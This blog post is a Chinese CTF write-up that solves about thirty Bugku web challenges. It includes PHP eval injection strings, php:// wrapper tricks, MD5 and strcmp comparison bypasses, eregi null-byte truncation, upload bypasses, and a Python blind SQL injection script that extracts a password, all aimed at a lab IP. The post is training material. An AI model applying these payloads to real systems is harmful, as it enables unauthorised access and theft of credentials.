---
title: "Bugku新平台-Web-wp"
published: 2020-12-10
tags: ["Bugku", "Writeup"]
category: "CTF/靶场WriteUp"
image: api
---

> 写在前面
> Bugku新平台真不错，以前老平台的题 ak 了一直没有总结 wp ，这回重新打一遍~~写个 wp~~(水篇博客)

# web1

F12查看源码得到`flag`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230004.png)

# web2

F12修改前端JS对输入长度的限制

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230258.png)

# web3

老萌新题了，但是不知道为什么打印两个flag出来

```php
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
flagflag{cd6f8684b6df613bf86e161e3d22ab98} flag{cd6f8684b6df613bf86e161e3d22ab98}
```

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230515.png)

# web4

懂得都懂

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230706.png)

# web5

`is_numeric`函数一个比较经典的截断漏洞，函数对于空字符`%00`，无论是`%00`放在前后都可以判断为非数值，而`%20`空格字符只能放在数值后才能让其判断为False

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210233808.png)

`is_numeric`函数另一个经典的漏洞是十六进制绕过漏洞，如果这个函数和mysql结合起来使用，就容易出问题

+ 函数在判断的时候，碰到十六进制数的时候，也会判断成数字

  ```php
  <?php
  echo is_numeric(233333);       # 1
  echo is_numeric('233333');  # 1
  echo is_numeric(0x233333);  # 1
  echo is_numeric('0x233333');   # 1
  echo is_numeric('233333abc');  # 0
  ?>
  ```

+ MySQL数据库同样支持16进制，也就是HEX编码。虽然不像is_numeric函数一样有着比较强的容错性，但还是能够完成如下操作

  ```mysql
  > insert into test (id, value) values (1, 0x74657374);
  > select * from test;
  | id | value |
  | 1  | test  |
  ```

在`is_numeric`函数单独使用的情况，或者特定情况下，可以将SQL注入的payload转十六进制传进去绕过waf

# web6

抓包重放发现一堆HTML实体编码

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210234924.png)

找个在线网站转一下就行

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210235517.png)

# web7

老一闪一闪亮晶晶了，F12打开持续记录，找传输回来的包有哪个有不同，然后再看响应

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211000514.png)

# web8

简单的本地文件包含+闭合绕过

```php
 <?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?> 
```

解题思路：闭合掉`var_dump`然后构造php语句把包含的`flag.php`打印出来

```php
eval("var_dump($a);");
//如果传参  hello=1);print_r(file("./flag.php"));//
//拼接进eval得到
eval("var_dump(1);print_r(file("./flag.php"));//);");
// //注释掉原来var_dump留下来的 );

//如果传参 hello=1);print_r(file("./flag.php")
//拼接进eval得到
eval("var_dump(1);print_r(file("./flag.php"));");
//利用了原来var_dump留下来的 );
```

> `print_r`和`var_dump`都可以用来打印flag.php

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211001515.png)

# web9

```php
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

正则的意思是只能输入大小写字母和0-9数字和下划线，`eval("var_dump($$args);");`中的`$$args`明示`$args`是一个数组，所以用`GLOBALS`超级全局变量来解

> `$GLOBALS`用来存储全局变量，全局变量的值在`$GLOBALS`里面是一个键值，即全局变量可以通过自己的变量名在`$GLOBALS`找到相对应的值

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211004423.png)

# web10

抓包重放，响应头里看到flag

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211005101.png)

# web11

扫目录发现`shell.php`，爆破`shell.php`得到密码`hack`，拿到flag

# web12

F12发现`dGVzdDEyMw==`，解base64得`test123`，猜测账号`admin`，加上`x-forwarded-for:127.0.0.1`即可

# web13

题目提示查看源码，发现源码`<script>`标签里有URL编码， 
 p1解码为

```javascript
function checkSubmit(){
var a=document.getElementById("password");
if("undefined"!=typeof a){
if("67d709b2b1234
```

p2解码为

```javascript
aa648cf6e87a7114f1"==a.value)
return!0;
alert("Error");
a.focus();
return!1
}
}
document.getElementById("levelQuest").onsubmit=checkSubmit;12345678
```

最后的eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));解码为

```javascript
eval(unescape(p1) + unescape('54aa2' + p2));1
```

根据eval()执行代码块的意思拼接出：

```
function checkSubmit(){
var a=document.getElementById("password");
//getElementById根据指定的 id 属性值得到对象
if("undefined"!=typeof a){
if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
return!0;
alert("Error");
a.focus();
return!1
}
}
document.getElementById("levelQuest").onsubmit=checkSubmit;
//onsubmit 事件会在表单中的确认按钮被点击时发生12345678910111213
```

判断变量a的值是否等于67d709b2b54aa2aa648cf6e87a7114f1 
 好像直接输入字符串提交就可以得到flag。

# web14

`php://filter/read=convert.base64-encode/resource=`

伪协议读源码，解码得到flag

# web15

burpsuite 一把梭 密码1\*\*\*\*

# web16

`index.php.bak`拿到php源码

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

随便扫一眼，非常简单的`str_replace`双写绕过 + `md5`弱比较 0e 绕过

```
?kekeyy1=QNKCDZO&kekeyy2=240610708
```

# web17

sqlmap 一把梭

# web18

直接上脚本

```python
import requests
from lxml import etree

url = 'http://114.67.246.176:14600/'
response = requests.session()
re = response.get(url=url).content.decode('utf-8')
elements = etree.HTML(re).xpath('//div/text()')[0][0:-3]
result = eval(elements)
print(result,'\n')
data = {
    'value':result
}
flag = response.post(url=url,data=data).content.decode('utf-8')
# flag_x = etree.HTML(flag)
# # print(etree.tostring(flag_x,encoding='utf-8').decode('utf-8'))
print(flag)
```

# web19

burpsuite抓包

`OK ,now you have to post the margin what you find`，得知需要以`POST`的请求方法把`margin`传过去，`margin`的内容应该是抓包得到头里面的base64的`flag`再base64解码一次，手动解再用burpsuite重放过去不行，所以写了脚本

```python
import requests
import base64
import re

url = 'http://114.67.246.176:11914/'
r = requests.session()                                    #获取session。
q = r.get(url)                                                 #以get方式去请求
text = q.headers['flag']                                  #获取返回数据包中flag字段
data = base64.b64decode(base64.b64decode(text)[-8:])  #第一次把flag中的字段进行base64解码，然后取解码后的后8位进行第二次base64解码
data={'margin':data}                                   #获取margin这个参数，
r2 = r.post(url,data = data)                        #使用post去请求
print(r2.text)                                            #返回信息
```

# web20

url 中`line=&filename=a2V5cy50eHQ=`得到关键信息，`filename`传参文件名字经过base64编码后的东西，`line`是具体到哪一行，没有修改`line`的值时候，试了一下去读`index.php`的内容，得到一个`<?php`，由此猜测而来

上脚本跑出index.php的所有代码

```python
import requests
for i in range(20):
    url = "http://114.67.246.176:16017/index.php?line=" + str(i) + "&filename=aW5kZXgucGhw"
    s = requests.get(url)
    print(s.text)
```

index.php

```php
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```

简单审一下，逻辑就是当 `cookie`的值等于`margin`时，会给`file_list[2]`数组赋值为`keys.php`，然后`filename`是从`file_list`这个数组里面找，所以思路就是伪造`cookie`等于`margin`让`file_list`包含进`keys.php`，然后跟读`index.php`一样去读取`keys.php`

# web21

一堆套娃解码

访问`1p.html`拿到第一层的base64

```js
var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
```

第二层解那段base64，又拿到一段url

```
JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==
```

```
%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
```

第三层再解一次url，拿到php源码

```php
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
?>
```

审一波源码

1. `id`要求为`0`，但是下面要求`id`为整数0才能加载
2. `$a`要求服务器端存在一个文件名，文件内容是`"bugku is a nice plateform!"`
3. 要求`$b`的第一个字符既等于字符'4'，又不等于整数4
4. `$a`中不含 **`.`**
5. 字符串`1114`要与字符串`111`连接变量 `$b` 的第一个字符构成的正则表达式匹配
6. `$b`长度大于5

对应的解题思路：

**`file_get_contents()`** 老熟人了，直接`php://input`

**`ereg()`和`eregi()`有空字符截断漏洞，在参数与中的正则表达式和待匹配字符串中遇到了空格，则截断并丢弃后面的数据**

函数原型：`int eregi(string pattern, string string, [array regs])`       

成功返回true，第一个是搜索规则，第二个是被搜索字符串
 在一个字符串搜索指定的模式的字符串。搜索不区分大小写。`eregi()`可以特别有用的检查有效性字符串,如密码，可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。

在本题里面`eregi("111".substr($b,0,1),"1114")` ，即111拼接上`substr($b,0,1)`，之后与"1114"比较，只要让"111"后面拼接上一个空格即`\x00`  就可以让`eregi`对后面截断，结果就是"111"等于"1114"。这里可以构造`$b="\x00abcdef"` 满足长度大于5即可

直接让`$b=\x00abcdef`不得行，写到url里还要将\x改成%，在请求过程中会自动进行`URL编码`，在提交请求时导致请求头截断。这个具体过程是因为，如果填的是`\x00`，在url编码阶段就会被截断`$b`还没被传送至php后台时已经成为了空（即`$b=''`），到了后台`$b`为空，就不符合要求了。所以直接用python把URL编码的过程手动做了，就不会被截断，就能顺利将数据传送至后台


直接上脚本

```python
import requests
import json

payload = "http://114.67.246.176:13237/hello.php/hello.php?id=aa&b=%00abcdef&a=php://input"
mysession = requests.session()
# headers = {'Content-Type': 'application/json'}
# b = {'value': 'bugku is a nice plateform!'}
r = mysession.get(payload, data='bugku is a nice plateform!')  # 不用构造成json格式了，直接发送data参数就行了
print(r.text)
```

# web23

```php
 <?php 
highlight_file('2.php');
$key='flag{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM )
{  
    die('key is: '.$key);
}?> 
```

正则的意思

`key`+`任意单个字符0次或多次`+`key`+`任意单个字符4~7次`+`key`+`:`+`/`+`任意单个字符`+`/`+`任意单个字符0次或多次`+`key`+`[a-z]`+`任意标点符号`

随便构造一个`keykey1111key:/1/keya#`

# web24

`code.txt`泄露源码

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

md5 弱比较 0e 绕过 + strcmp 函数数组绕过

`v1=s878926199a&v2=s155964671a&v3[]=1`

# web25

`SQL约束攻击`早有耳闻

[https://www.freebuf.com/articles/web/124537.html]

[https://www.runoob.com/sql/sql-constraints.html]

注册账号时，`admin+20个空格`账号权限等同于`admin`

# web26

`referer:https://www.google.com`

# web27

md5 的 0e 弱比较碰撞，传参就行

# web28

`x-forwarded-for:127.0.0.1`

# web29

```php
 <?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
?> 
```

sha1数组绕过

# web30

`php://input`

# web31

dirmap扫出来`robots.txt`，`robots.txt`告诉我有个`resusl.php`，`resusl.php`告诉我`if ($_GET[x]==$password)`，题目告诉我我得是管理员，所以`$x=admin`即可

# web32

经典文件上传绕过姿势` multipart/form-data `、` content-type`和`php5`

` multipart/form-data `：  需要在表单中进行文件上传时，需要使用该格式，通过表单对文件格式再进行一次判断，是在后端进行判断，只支持小写字符，通过对请求头中的Content-Type进行大小写绕过，将multipart/form-data随便大写一个字母就可以了

`content-type`：标明上传的文件类型

`php5`：php的解析漏洞

**form表单的enctype属性：规定了form表单数据在发送到服务器时候的编码方式**

    application/x-www-form-urlencoded：默认编码方式
    multipart/form-data：指定传输数据为二进制数据，例如图片、mp3、文件
    text/plain：纯文本的传输。空格转换为“+”，但不支持特殊字符编码。
# web38

解释 payload：

**`admin'^(ascii(mid(database()from({})))<>{})^0#`**

1. 为了绕过空格过滤，用括号隔开，过滤了等号，用不等号 <>代替，只要是布尔值就可以。

2. mid()函数和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？

   因此，这里用到了ascii()取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。

3. 每个字符的ascii码判断，是否不等于给定的数字，会得到一个布尔值(0或1)再与结尾的0进行运算。

   如果数据库名的第一位的ascii码值不是97，where条件是username=’admin’\^1\^0

   返回值是username does not exist!

   如果数据库名的第一位的ascii码值是97，where条件是username=’admin’\^0\^0

   返回值会是password error!

   这就构成了布尔报错注入。

4. 最后^0的妙用！ 因为’admin’\^0\^0和’admin’\^1\^1是一样的，我们可以构造后者来看前者成立时的情况。 因为这里即使是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也无法知道。

```python
import requests
str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="
url="http://114.67.246.176:18157/"
r=requests.session()
def database():
    result=""
    for i in range(30):
        flag = 0
        for j in str_all:
            payload="admin'^(ascii(mid(database()from({})))<>{})^0#".format(str(i),ord(j))
            data = {
                "username": payload,
                "password": "123"
            }
            s=r.post(url,data)
            print(payload)
            if "error" in s.text:
                result+=j
                print(result)
            if flag == 0:
                break
def password():
    result=""
    for i in range(40):
        flag=0
        for j in str_all:
            payload = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})^0#".format(str(i+1),ord(j))
            data = {
                "username": payload,
                "password": "123"
            }
            s=r.post(url,data)
            #print(payload)
            if "error" in s.text:
                result+=j
                flag=1
                print('**************************',result)
        if flag==0:
            break
#database()
password()
```
